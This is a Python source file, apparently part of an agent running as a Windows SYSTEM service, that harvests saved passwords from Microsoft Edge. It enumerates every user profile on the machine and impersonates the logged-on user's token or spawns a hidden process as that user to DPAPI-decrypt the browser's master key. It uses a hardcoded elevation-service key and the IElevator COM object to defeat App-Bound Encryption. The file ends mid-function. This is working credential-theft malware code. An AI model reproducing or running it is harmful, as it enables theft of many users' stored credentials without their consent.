"""
Retrieval of credentials and passwords saved in Microsoft Edge.
"""
import os
import sys
import sqlite3
import shutil
import tempfile
import json
import base64
import time
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305

crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
wtsapi32 = ctypes.windll.wtsapi32
ole32 = ctypes.windll.ole32

try:
    import win32com.client
    WIN32COM_AVAILABLE = True
except ImportError:
    WIN32COM_AVAILABLE = False

_debug_logger = None

WTS_CURRENT_SERVER_HANDLE = 0
WTSActive = 0
MAXIMUM_ALLOWED = 0x02000000
SecurityImpersonation = 2
TokenPrimary = 1
TokenImpersonation = 2
TOKEN_QUERY = 0x0008
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004

class WTS_SESSION_INFO(ctypes.Structure):
    _fields_ = [
        ("SessionId", wintypes.DWORD),
        ("pWinStationName", wintypes.LPWSTR),
        ("State", wintypes.DWORD)
    ]


class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_byte)),
    ]


class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD), ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR), ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD), ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD), ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD), ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD), ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.c_void_p), ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE), ('hStdError', wintypes.HANDLE)
    ]


class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE), ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD), ('dwThreadId', wintypes.DWORD)
    ]


CREATE_NO_WINDOW = 0x08000000
NORMAL_PRIORITY_CLASS = 0x00000020


def _bytes_to_blob(data: bytes) -> DATA_BLOB:
    """Converts bytes to DATA_BLOB for DPAPI."""
    blob = DATA_BLOB()
    blob.cbData = len(data)
    if data:
        buf = (ctypes.c_byte * len(data))()
        buf[:] = data
        blob.pbData = buf
    else:
        blob.pbData = None
    return blob


def _blob_to_bytes(blob: DATA_BLOB) -> bytes:
    """Converts a DATA_BLOB to bytes."""
    size = int(blob.cbData)
    if not size or not blob.pbData:
        return b""
    buf = ctypes.cast(blob.pbData, ctypes.POINTER(ctypes.c_byte * size))
    data = bytes(buf.contents)
    ctypes.windll.kernel32.LocalFree(blob.pbData)
    return data


def _get_active_user_session():
    """Retrieves the active user session ID."""
    try:
        count = wintypes.DWORD()
        sessions_ptr = ctypes.POINTER(WTS_SESSION_INFO)()
        
        if wtsapi32.WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, ctypes.byref(sessions_ptr), ctypes.byref(count)):
            try:
                for i in range(count.value):
                    if sessions_ptr[i].State == WTSActive and sessions_ptr[i].SessionId != 0:
                        return sessions_ptr[i].SessionId
            finally:
                wtsapi32.WTSFreeMemory(sessions_ptr)
    except Exception:
        pass
    return kernel32.WTSGetActiveConsoleSessionId()


def _dpapi_unprotect(data: bytes, use_impersonation: bool = True) -> bytes:
    """
    Decrypts data with DPAPI.
    
    In session 0 (SYSTEM service), uses user impersonation to
    decrypt user data with DPAPI.
    """
    user_token = None
    primary_token = None
    impersonated = False
    
    if use_impersonation and sys.platform == "win32":
        try:
            sess_id = wintypes.DWORD()
            if kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_id)):
                if sess_id.value == 0:
                    session_id = _get_active_user_session()
                    if session_id and session_id != 0xFFFFFFFF:
                        user_token = wintypes.HANDLE()
                        if wtsapi32.WTSQueryUserToken(session_id, ctypes.byref(user_token)):
                            primary_token = wintypes.HANDLE()
                            if advapi32.DuplicateTokenEx(
                                user_token,
                                MAXIMUM_ALLOWED,
                                None,
                                SecurityImpersonation,
                                TokenPrimary,
                                ctypes.byref(primary_token)
                            ):
                                if advapi32.ImpersonateLoggedOnUser(primary_token):
                                    impersonated = True
        except Exception as e:
            msg = f"Impersonation error: {e}"
            print(f"[DEBUG] {msg}", file=sys.stderr)
            if _debug_logger:
                _debug_logger(msg)
    
    try:
        in_blob = _bytes_to_blob(data)
        out_blob = DATA_BLOB()
        descr = wintypes.LPWSTR()
        ok = crypt32.CryptUnprotectData(
            ctypes.byref(in_blob),
            ctypes.byref(descr),
            None,
            None,
            None,
            0,
            ctypes.byref(out_blob),
        )
        if not ok:
            error_code = ctypes.get_last_error()
            error_msg = f"DPAPI error: {error_code}"
            print(f"[DEBUG] {error_msg}", file=sys.stderr)
            if _debug_logger:
                _debug_logger(error_msg)
            raise ctypes.WinError(error_code)
        return _blob_to_bytes(out_blob)
    finally:
        if impersonated:
            try:
                advapi32.RevertToSelf()
            except Exception:
                pass
        if primary_token:
            try:
                kernel32.CloseHandle(primary_token)
            except Exception:
                pass
        if user_token:
            try:
                kernel32.CloseHandle(user_token)
            except Exception:
                pass


def _dpapi_unprotect_via_process(data: bytes) -> bytes:
    """
    Decrypts data with DPAPI using CreateProcessAsUser.
    More reliable than impersonation for Session 0.
    """
    if sys.platform != "win32":
        raise NotImplementedError("DPAPI is Windows-only")
    
    try:
        sess_id = wintypes.DWORD()
        if not kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_id)):
            raise Exception("Cannot get session ID")
        
        if sess_id.value != 0:
            return _dpapi_unprotect(data, use_impersonation=False)
        
        session_id = _get_active_user_session()
        if not session_id or session_id == 0xFFFFFFFF:
            raise Exception("No active user session found")
        
        user_token = wintypes.HANDLE()
        if not wtsapi32.WTSQueryUserToken(session_id, ctypes.byref(user_token)):
            raise Exception("WTSQueryUserToken failed")
        
        primary_token = wintypes.HANDLE()
        try:
            if not advapi32.DuplicateTokenEx(
                user_token,
                MAXIMUM_ALLOWED,
                None,
                SecurityImpersonation,
                TokenPrimary,
                ctypes.byref(primary_token)
            ):
                raise Exception("DuplicateTokenEx failed")
            
            temp_dir = os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Windows\\Temp'))
            if not os.path.exists(temp_dir):
                temp_dir = 'C:\\Windows\\Temp'
            
            temp_script_path = os.path.join(temp_dir, f"dpapi_decrypt_{os.getpid()}_{id(data)}.py")
            temp_input_path = os.path.join(temp_dir, f"dpapi_input_{os.getpid()}_{id(data)}.bin")
            temp_output_path = os.path.join(temp_dir, f"dpapi_output_{os.getpid()}_{id(data)}.bin")
            
            try:
                with open(temp_input_path, 'wb') as f:
                    f.write(data)
                
                py_script = f'''import ctypes
import ctypes.wintypes as wintypes
import sys

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_byte)),
    ]

crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
kernel32 = ctypes.windll.kernel32

def bytes_to_blob(data):
    blob = DATA_BLOB()
    blob.cbData = len(data)
    if data:
        buf = (ctypes.c_byte * len(data))()
        buf[:] = data
        blob.pbData = buf
    else:
        blob.pbData = None
    return blob

def blob_to_bytes(blob):
    size = int(blob.cbData)
    if not size or not blob.pbData:
        return b""
    buf = ctypes.cast(blob.pbData, ctypes.POINTER(ctypes.c_byte * size))
    data = bytes(buf.contents)
    kernel32.LocalFree(blob.pbData)
    return data

try:
    with open(r"{temp_input_path}", "rb") as f:
        encrypted_data = f.read()
    
    in_blob = bytes_to_blob(encrypted_data)
    out_blob = DATA_BLOB()
    descr = wintypes.LPWSTR()
    
    ok = crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        ctypes.byref(descr),
        None,
        None,
        None,
        0,
        ctypes.byref(out_blob),
    )
    
    if not ok:
        error_code = ctypes.get_last_error()
        with open(r"{temp_output_path}", "wb") as f:
            f.write(b"ERROR:" + str(error_code).encode())
        sys.exit(1)
    
    decrypted = blob_to_bytes(out_blob)
    with open(r"{temp_output_path}", "wb") as f:
        f.write(decrypted)
    
except Exception as e:
    with open(r"{temp_output_path}", "wb") as f:
        f.write(b"ERROR:" + str(e).encode())
    sys.exit(1)
'''
                
                with open(temp_script_path, 'w', encoding='utf-8') as f:
                    f.write(py_script)
                
                python_exe = None
                if sys.executable and os.path.exists(sys.executable):
                    python_exe = sys.executable
                else:
                    for py_cmd in ['python.exe', 'py.exe', 'python3.exe']:
                        python_exe = py_cmd
                        break
                
                if not python_exe:
                    raise Exception("Python executable not found")
                
                py_cmd = f'"{python_exe}" "{temp_script_path}"'
                cmd_buf = ctypes.create_unicode_buffer(py_cmd)
                
                si = STARTUPINFO()
                si.cb = ctypes.sizeof(STARTUPINFO)
                si.lpDesktop = "winsta0\\default"
                pi = PROCESS_INFORMATION()
                
                if not advapi32.CreateProcessAsUserW(
                    primary_token,
                    None,
                    cmd_buf,
                    None,
                    None,
                    False,
                    CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,
                    None,
                    None,
                    ctypes.byref(si),
                    ctypes.byref(pi)
                ):
                    raise Exception(f"CreateProcessAsUser failed: {ctypes.get_last_error()}")
                
                WAIT_OBJECT_0 = 0
                WAIT_TIMEOUT = 0x00000102
                wait_result = kernel32.WaitForSingleObject(pi.hProcess, 30000)
                
                exit_code = wintypes.DWORD()
                kernel32.GetExitCodeProcess(pi.hProcess, ctypes.byref(exit_code))
                
                kernel32.CloseHandle(pi.hProcess)
                kernel32.CloseHandle(pi.hThread)
                
                if wait_result == WAIT_TIMEOUT:
                    raise Exception(f"Python script timeout (wait_result={wait_result}, exit_code={exit_code.value})")
                elif wait_result != WAIT_OBJECT_0:
                    raise Exception(f"Python process error (wait_result={wait_result}, exit_code={exit_code.value})")
                
                if exit_code.value != 0:
                    raise Exception(f"Python script exited with error code {exit_code.value}")
                
                if os.path.exists(temp_output_path):
                    import time
                    time.sleep(0.3)
                    
                    with open(temp_output_path, 'rb') as f:
                        result = f.read()
                    
                    if result.startswith(b"ERROR:"):
                        error_msg = result[6:].decode('utf-8', errors='ignore')
                        raise Exception(f"Python script error: {error_msg}")
                    
                    if not result:
                        raise Exception("Python script returned empty output")
                    
                    return result
                else:
                    raise Exception(f"Python script did not produce output file: {temp_output_path}")
                    
            finally:
                try:
                    if os.path.exists(temp_script_path):
                        os.unlink(temp_script_path)
                    if os.path.exists(temp_input_path):
                        os.unlink(temp_input_path)
                    if os.path.exists(temp_output_path):
                        os.unlink(temp_output_path)
                except Exception as e:
                    print(f"[DEBUG] Error cleaning temp files: {e}", file=sys.stderr)
                    
        finally:
            if primary_token:
                kernel32.CloseHandle(primary_token)
            if user_token:
                kernel32.CloseHandle(user_token)
                
    except Exception as e:
        msg = f"Error DPAPI via process: {e}"
        print(f"[DEBUG] {msg}", file=sys.stderr)
        if _debug_logger:
            _debug_logger(msg)
        raise


def _get_edge_user_data_path():
    """
    Returns the path to the Edge User Data folder.
    Uses Windows environment variables.
    """
    if sys.platform != "win32":
        return None
    
    local_appdata = os.environ.get("LOCALAPPDATA")
    if not local_appdata:
        return None
    
    edge_user_data = os.path.join(local_appdata, "Microsoft", "Edge", "User Data")
    
    if os.path.exists(edge_user_data):
        return edge_user_data
    
    return None


def _get_all_edge_profiles():
    """
    Returns a list of all Edge profiles found.
    Format: [(profile_path, profile_name, user_profile_path), ...]
    Handles the case where the agent runs in session 0 (SYSTEM service).
    """
    if sys.platform != "win32":
        return []
    
    profiles = []
    
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    is_system_context = "systemprofile" in local_appdata.lower() if local_appdata else False
    
    if is_system_context:
        try:
            import winreg
            reg_key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key_path) as key:
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey_path = os.path.join(reg_key_path, subkey_name)
                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path) as subkey:
                            try:
                                user_profile_path = winreg.QueryValueEx(subkey, "ProfileImagePath")[0]
                                edge_user_data = os.path.join(
                                    user_profile_path, 
                                    "AppData", 
                                    "Local", 
                                    "Microsoft", 
                                    "Edge", 
                                    "User Data"
                                )
                                
                                if os.path.exists(edge_user_data):
                                    try:
                                        for item in os.listdir(edge_user_data):
                                            profile_dir = os.path.join(edge_user_data, item)
                                            if not os.path.isdir(profile_dir):
                                                continue
                                            if item in ["System Profile", "CrashDumps", "Crash Reports"]:
                                                continue
                                            
                                            login_data_path = os.path.join(profile_dir, "Login Data")
                                            if os.path.exists(login_data_path) and os.path.isfile(login_data_path):
                                                username = os.path.basename(user_profile_path)
                                                profile_name = f"{username}/{item}"
                                                profiles.append((profile_dir, profile_name, user_profile_path))
                                    except (OSError, PermissionError):
                                        pass
                            except FileNotFoundError:
                                pass
                        i += 1
                    except OSError:
                        break
        except Exception:
            pass
    else:
        user_data_path = _get_edge_user_data_path()
        if user_data_path and os.path.exists(user_data_path):
            try:
                for item in os.listdir(user_data_path):
                    profile_dir = os.path.join(user_data_path, item)
                    if not os.path.isdir(profile_dir):
                        continue
                    if item in ["System Profile", "CrashDumps", "Crash Reports"]:
                        continue
                    
                    login_data_path = os.path.join(profile_dir, "Login Data")
                    if os.path.exists(login_data_path) and os.path.isfile(login_data_path):
                        user_profile_path = os.path.dirname(os.path.dirname(os.path.dirname(user_data_path)))
                        profiles.append((profile_dir, item, user_profile_path))
            except (OSError, PermissionError):
                pass
    
    return profiles


def _extract_aes_key_from_decrypted_data(decrypted_data):
    """
    Extracts the 32-byte AES key from DPAPI decrypted data.
    The decrypted data may contain additional metadata.
    """
    if not decrypted_data:
        return None
    
    if len(decrypted_data) == 32:
        if decrypted_data[:5] == b'\x01\x00\x00\x00\xd0':
            return None
        return decrypted_data
    
    def is_valid_aes_key(key_bytes):
        if len(key_bytes) != 32:
            return False
        if key_bytes == b'\x00' * 32 or len(set(key_bytes)) <= 1:
            return False
        if key_bytes[:5] == b'\x01\x00\x00\x00\xd0':
            return False
        unique_count = len(set(key_bytes))
        non_zero_count = sum(1 for b in key_bytes if b != 0)
        return unique_count >= 24 and non_zero_count >= 28
    
    if len(decrypted_data) >= 32:
        potential_key_end = decrypted_data[-32:]
        if is_valid_aes_key(potential_key_end):
            return potential_key_end
    
    if len(decrypted_data) >= 32:
        potential_key_start = decrypted_data[:32]
        if is_valid_aes_key(potential_key_start):
            return potential_key_start
    
    if len(decrypted_data) > 32:
        best_key = None
        best_entropy = 0
        
        for i in range(0, len(decrypted_data) - 31, 32):
            potential_key = decrypted_data[i:i+32]
            if is_valid_aes_key(potential_key):
                unique_count = len(set(potential_key))
                if unique_count > best_entropy:
                    best_entropy = unique_count
                    best_key = potential_key
        
        if best_key:
            return best_key
        
        best_key = None
        best_entropy = 0
        
        for i in range(0, len(decrypted_data) - 31, 1):
            potential_key = decrypted_data[i:i+32]
            if is_valid_aes_key(potential_key):
                unique_count = len(set(potential_key))
                if unique_count > best_entropy:
                    best_entropy = unique_count
                    best_key = potential_key
        
        if best_key:
            if _debug_logger:
                _debug_logger(f"Extracted AES key from position in decrypted data (entropy: {best_entropy})")
            return best_key
        
        best_key = None
        best_entropy = 0
        
        def is_valid_aes_key_relaxed(key_bytes):
            if len(key_bytes) != 32:
                return False
            if key_bytes == b'\x00' * 32 or len(set(key_bytes)) <= 1:
                return False
            if key_bytes[:5] == b'\x01\x00\x00\x00\xd0':
                return False
            unique_count = len(set(key_bytes))
            non_zero_count = sum(1 for b in key_bytes if b != 0)
            return unique_count >= 20 and non_zero_count >= 24
        
        for i in range(0, len(decrypted_data) - 31, 1):
            potential_key = decrypted_data[i:i+32]
            if is_valid_aes_key_relaxed(potential_key):
                unique_count = len(set(potential_key))
                if unique_count > best_entropy:
                    best_entropy = unique_count
                    best_key = potential_key
        
        if best_key:
            if _debug_logger:
                _debug_logger(f"Extracted AES key with relaxed criteria from position in decrypted data (entropy: {best_entropy})")
            return best_key
    
    return None


def _get_aes_key_from_local_state(local_state_path):
    """
    Extracts and decrypts AES key from Local State file.
    Returns a dict with keys for v10 and v20: {"v10": key_bytes, "v20": key_bytes}
    """
    keys = {"v10": None, "v20": None}
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        os_crypt = data.get("os_crypt", {})
        
        encrypted_key_b64 = os_crypt.get("encrypted_key")
        if encrypted_key_b64:
            try:
                encrypted_key = base64.b64decode(encrypted_key_b64)
                
                if encrypted_key[:5] == b'DPAPI':
                    encrypted_key = encrypted_key[5:]
                
                try:
                    aes_key = _dpapi_unprotect(encrypted_key, use_impersonation=True)
                    keys["v10"] = aes_key
                    msg = "AES key (v10) decryption with impersonation succeeded"
                    print(f"[DEBUG] {msg}", file=sys.stderr)
                    if _debug_logger:
                        _debug_logger(msg)
                except Exception as e:
                    msg = f"AES key (v10) decryption with impersonation failed: {e}"
                    print(f"[DEBUG] {msg}", file=sys.stderr)
                    if _debug_logger:
                        _debug_logger(msg)
                    try:
                        aes_key = _dpapi_unprotect(encrypted_key, use_impersonation=False)
                        keys["v10"] = aes_key
                        msg = "AES key (v10) decryption without impersonation succeeded"
                        print(f"[DEBUG] {msg}", file=sys.stderr)
                        if _debug_logger:
                            _debug_logger(msg)
                    except Exception as e2:
                        msg = f"AES key (v10) decryption without impersonation failed: {e2}"
                        print(f"[DEBUG] {msg}", file=sys.stderr)
                        if _debug_logger:
                            _debug_logger(msg)
                        try:
                            aes_key = _dpapi_unprotect_via_process(encrypted_key)
                            keys["v10"] = aes_key
                            msg = "AES key (v10) decryption via process succeeded"
                            print(f"[DEBUG] {msg}", file=sys.stderr)
                            if _debug_logger:
                                _debug_logger(msg)
                        except Exception as e3:
                            msg = f"AES key (v10) decryption via process failed: {e3}"
                            print(f"[DEBUG] {msg}", file=sys.stderr)
                            if _debug_logger:
                                _debug_logger(msg)
            except Exception as e:
                msg = f"Error processing v10 key: {e}"
                print(f"[DEBUG] {msg}", file=sys.stderr)
                if _debug_logger:
                    _debug_logger(msg)
        
        encrypted_key_v20_b64 = (
            os_crypt.get("app_bound_encryption_key") or 
            os_crypt.get("encrypted_key_v20") or
            os_crypt.get("app_bound_key") or
            os_crypt.get("v20_key")
        )
        if not encrypted_key_v20_b64:
            for key_name, key_value in os_crypt.items():
                if isinstance(key_value, str):
                    if key_value.startswith("APPB"):
                        encrypted_key_v20_b64 = key_value
                        break
                    if ("v20" in key_name.lower() or "app_bound" in key_name.lower()) and len(key_value) > 0:
                        encrypted_key_v20_b64 = key_value
                        break
        
        if encrypted_key_v20_b64:
            try:
                encrypted_key_v20 = base64.b64decode(encrypted_key_v20_b64)
                
                app_bound_prefix_removed = False
                if encrypted_key_v20[:4] == b'APPB':
                    encrypted_key_v20 = encrypted_key_v20[4:]
                    app_bound_prefix_removed = True
                elif encrypted_key_v20[:5] == b'DPAPI':
                    encrypted_key_v20 = encrypted_key_v20[5:]
                
                try:
                    sess_id = wintypes.DWORD()
                    is_session_0 = False
                    if kernel32.ProcessIdToSessionId(os.getpid(), ctypes.byref(sess_id)):
                        is_session_0 = (sess_id.value == 0)
                    
                    if is_session_0:
                        try:
                            first_decrypted = _dpapi_unprotect(encrypted_key_v20, use_impersonation=False)
                            if _debug_logger:
                                _debug_logger(f"v20 first DPAPI decryption (SYSTEM) succeeded: {len(first_decrypted)}B")
                            
                            try:
                                second_decrypted = _dpapi_unprotect(first_decrypted, use_impersonation=True)
                                if _debug_logger:
                                    _debug_logger(f"v20 second DPAPI decryption (user) succeeded: {len(second_decrypted)}B")
                                
                                elevation_service_aes_key = base64.b64decode("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
                                
                                if len(second_decrypted) >= 61:
                                    flag = second_decrypted[0]
                                    if flag == 1:
                                        iv = second_decrypted[1:13]
                                        ciphertext = second_decrypted[13:45]
                                        tag = second_decrypted[45:61]
                                        
                                        cipher = AESGCM(elevation_service_aes_key)
                                        final_key = cipher.decrypt(iv, ciphertext + tag, None)
                                        
                                        if len(final_key) == 32:
                                            keys["v20"] = final_key
                                            msg = f"AES key (v20/APPB) decryption with double DPAPI + elevation service key succeeded"
                                            print(f"[DEBUG] {msg}", file=sys.stderr)
                                            if _debug_logger:
                                                _debug_logger(msg)
                                        else:
                                            if _debug_logger:
                                                _debug_logger(f"v20 final key has wrong size: {len(final_key)} bytes (expected 32)")
                                    elif flag == 3:
                                        try:
                                            iv = second_decrypted[1:13]
                                            ciphertext = second_decrypted[13:45]
                                            tag = second_decrypted[45:61]
                                            
                                            cipher = ChaCha20Poly1305(elevation_service_aes_key)
                                            final_key = cipher.decrypt(iv, ciphertext + tag, None)
                                            
                                            if len(final_key) == 32:
                                                keys["v20"] = final_key
                                                msg = f"AES key (v20/APPB) decryption with double DPAPI + elevation service key (ChaCha20) succeeded"
                                                print(f"[DEBUG] {msg}", file=sys.stderr)
                                                if _debug_logger:
                                                    _debug_logger(msg)
                                            else:
                                                if _debug_logger:
                                                    _debug_logger(f"v20 final key (ChaCha20) has wrong size: {len(final_key)} bytes (expected 32)")
                                        except Exception as chacha_e:
                                            if _debug_logger:
                                                _debug_logger(f"v20 ChaCha20-Poly1305 decryption failed: {chacha_e}")
                                    else:
                                        if _debug_logger:
                                            _debug_logger(f"v20 unknown flag format: {flag}, trying to extract key anyway")
                                        try:
                                            aes_key_v20 = _extract_aes_key_from_decrypted_data(second_decrypted)
                                            if aes_key_v20 and len(aes_key_v20) == 32:
                                                keys["v20"] = aes_key_v20
                                                msg = f"AES key (v20/APPB) extracted from double DPAPI result (flag={flag})"
                                                print(f"[DEBUG] {msg}", file=sys.stderr)
                                                if _debug_logger:
                                                    _debug_logger(msg)
                                        except Exception:
                                            pass
                                else:
                                    if _debug_logger:
                                        _debug_logger(f"v20 second_decrypted too short: {len(second_decrypted)} bytes (expected >= 61)")
                                
                            except Exception as e2:
                                if _debug_logger:
                                    _debug_logger(f"v20 second DPAPI decryption failed: {e2}")
                        except Exception as e1:
                            if _debug_logger:
                                _debug_logger(f"v20 first DPAPI decryption (SYSTEM) failed: {e1}")
                    
                    if not keys.get("v20"):
                        try:
                            decrypted_data = _dpapi_unprotect(encrypted_key_v20, use_impersonation=True)
                            aes_key_v20 = _extract_aes_key_from_decrypted_data(decrypted_data)
                            if aes_key_v20 and len(aes_key_v20) == 32:
                                keys["v20"] = aes_key_v20
                                msg = f"AES key (v20/APPB) decryption with impersonation succeeded (extracted {len(decrypted_data)}B -> 32B)"
                                print(f"[DEBUG] {msg}", file=sys.stderr)
                                if _debug_logger:
                                    _debug_logger(msg)
                            else:
                                msg = f"AES key (v20/APPB) decryption succeeded but extraction failed: decrypted={len(decrypted_data)}B, extracted={len(aes_key_v20) if aes_key_v20 else 0}B"
                                print(f"[DEBUG] {msg}", file=sys.stderr)
                                if _debug_logger:
                                    _debug_logger(msg)
                        except Exception as e:
                            msg = f"AES key (v20/APPB) decryption with impersonation failed: {e}"
                            print(f"[DEBUG] {msg}", file=sys.stderr)
                            if _debug_logger:
                                _debug_logger(msg)
                            try:
                                decrypted_data = _dpapi_unprotect(encrypted_key_v20, use_impersonation=False)
                                aes_key_v20 = _extract_aes_key_from_decrypted_data(decrypted_data)
                                if aes_key_v20 and len(aes_key_v20) == 32:
                                    keys["v20"] = aes_key_v20
                                    msg = f"AES key (v20/APPB) decryption without impersonation succeeded (extracted {len(decrypted_data)}B -> 32B)"
                                    print(f"[DEBUG] {msg}", file=sys.stderr)
                                    if _debug_logger:
                                        _debug_logger(msg)
                                else:
                                    msg = f"AES key (v20/APPB) decryption without impersonation succeeded but extraction failed: decrypted={len(decrypted_data)}B, extracted={len(aes_key_v20) if aes_key_v20 else 0}B"
                                    print(f"[DEBUG] {msg}", file=sys.stderr)
                                    if _debug_logger:
                                        _debug_logger(msg)
                            except Exception as e2:
                                msg = f"AES key (v20/APPB) decryption without impersonation failed: {e2}"
                                print(f"[DEBUG] {msg}", file=sys.stderr)
                                if _debug_logger:
                                    _debug_logger(msg)
                                try:
                                    decrypted_data = _dpapi_unprotect_via_process(encrypted_key_v20)
                                    aes_key_v20 = _extract_aes_key_from_decrypted_data(decrypted_data)
                                    if aes_key_v20 and len(aes_key_v20) == 32:
                                        keys["v20"] = aes_key_v20
                                        msg = f"AES key (v20/APPB) decryption via process succeeded (extracted {len(decrypted_data)}B -> 32B)"
                                        print(f"[DEBUG] {msg}", file=sys.stderr)
                                        if _debug_logger:
                                            _debug_logger(msg)
                                    else:
                                        msg = f"AES key (v20/APPB) decryption via process succeeded but extraction failed: decrypted={len(decrypted_data)}B, extracted={len(aes_key_v20) if aes_key_v20 else 0}B"
                                        print(f"[DEBUG] {msg}", file=sys.stderr)
                                        if _debug_logger:
                                            _debug_logger(msg)
                                except Exception as e3:
                                    msg = f"AES key (v20/APPB) decryption via process failed: {e3}"
                                    print(f"[DEBUG] {msg}", file=sys.stderr)
                                    if _debug_logger:
                                        _debug_logger(msg)
                except Exception as e_try:
                    if _debug_logger:
                        _debug_logger(f"Error in v20 key extraction methods: {e_try}")
            except Exception as e:
                msg = f"Error processing v20 key: {e}"
                print(f"[DEBUG] {msg}", file=sys.stderr)
                if _debug_logger:
                    _debug_logger(msg)
        
        if keys["v20"] is None and keys["v10"] is not None:
            keys["v20"] = keys["v10"]
            msg = "Using v10 key for v20 decryption (fallback)"
            print(f"[DEBUG] {msg}", file=sys.stderr)
            if _debug_logger:
                _debug_logger(msg)
        
    except Exception as e:
        msg = f"Error reading Local State: {e}"
        print(f"[DEBUG] {msg}", file=sys.stderr)
        if _debug_logger:
            _debug_logger(msg)
    
    return keys


def _decrypt_password_v20_com(encrypted_data, url=None):
    """
    Tries to decrypt a v20 password using Edge's IElevator COM object.
    
    IMPORTANT: Edge's v20 App-Bound Encryption format requires a specific COM call
    (IElevator.DecryptData) which validates that the call comes from the Edge installation directory.
    To bypass this validation, it generally requires:
    1. DLL injection into the Edge process (complex)
    2. Or use specialized tools like ChromElevator
    
    This simple implementation tries to use COM directly but may fail
    due to path validation.
    
    References:
    - https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
    - https://medium.com/@xaitax/the-curious-case-of-the-cantankerous-com-decrypting-microsoft-edges-app-bound-encryption-266cc52bc417
    
    Args:
        encrypted_data: Encrypted data (full password_blob)
        url: Site URL (optional, for validation)
    
    Returns:
        Decrypted password or None if failed
    """
    if not WIN32COM_AVAILABLE:
        if _debug_logger:
            _debug_logger("win32com not available, cannot use COM for v20 decryption")
        return None
    
    try:
        elevator = None
        
        try:
            elevator = win32com.client.Dispatch("Elevator.Elevator")
        except Exception:
            try:
                elevator = win32com.client.Dispatch("MicrosoftEdge.Elevator")
            except Exception:
                try:
                    elevator = win32com.client.Dispatch("{8F7B6792-784D-4047-845D-1782EFBEF205}")
                except Exception as e:
                    if _debug_logger:
                        _debug_logger(f"Failed to create COM object: {type(e).__name__}: {e}")
                    return None
        
        if not elevator:
            if _debug_logger:
                _debug_logger("Could not create COM object IElevator")
            return None
        
        try:
            if isinstance(encrypted_data, bytes):
                decrypted_data = elevator.DecryptData(encrypted_data)
            else:
                decrypted_data = elevator.DecryptData(bytes(encrypted_data))
            
            if decrypted_data:
                if isinstance(decrypted_data, (bytes, bytearray)):
                    return decrypted_data.decode('utf-8', errors='ignore')
                elif isinstance(decrypted_data, str):
                    return decrypted_data
                else:
                    return str(decrypted_data)
            
        except Exception as e:
            if _debug_logger:
                _debug_logger(f"COM DecryptData call failed: {type(e).__name__}: {e}")
                _debug_logger("Note: COM decryption may require DLL injection into Edge process")
            return None
            
    except Exception as e:
        if _debug_logger:
            _debug_logger(f"COM initialization failed: {type(e).__name__}: {e}")
        return None
    
    return None


def _decrypt_password_aes(password_blob, aes_keys, url=None):
    """
    Decrypts a password encrypted with AES-GCM from Edge.
    Supported formats: v10 and v20
    v10 format: version (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
    v20 format: version (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
                (may require associated data for App-Bound Encryption)
    
    Args:
        password_blob: Encrypted password data
        aes_keys: Dict with keys {"v10": key_bytes, "v20": key_bytes}
                  or a single key (for compatibility)
        url: Site URL (for v20 associated data)
    """
    if not password_blob or len(password_blob) < 31:
        if _debug_logger:
            _debug_logger(f"Password blob too short: {len(password_blob) if password_blob else 0} bytes")
        return None
    
    if isinstance(aes_keys, dict):
        pass
    elif aes_keys:
        aes_keys = {"v10": aes_keys, "v20": aes_keys}
    else:
        if _debug_logger:
            _debug_logger("AES keys are None or empty")
        return None
    
    try:
        version = password_blob[:3]
        if version not in [b'v10', b'v20']:
            if _debug_logger:
                _debug_logger(f"Password blob format not supported, version: {version}")
            return None
        
        version_str = version.decode('utf-8', errors='ignore')
        
        aes_key = None
        if version_str == "v20":
            aes_key = aes_keys.get("v20")
            if not aes_key and aes_keys.get("v10"):
                aes_key = aes_keys.get("v10")
                if _debug_logger:
                    _debug_logger("Using v10 key for v20 decryption (fallback)")
        else:
            aes_key = aes_keys.get(version_str)
        
        if not aes_key:
            if _debug_logger:
                _debug_logger(f"No AES key available for format {version_str}")
            return None
        
        if len(aes_key) != 32:
            if _debug_logger:
                _debug_logger(f"AES key has wrong size: {len(aes_key)} bytes (expected 32)")
            return None
        
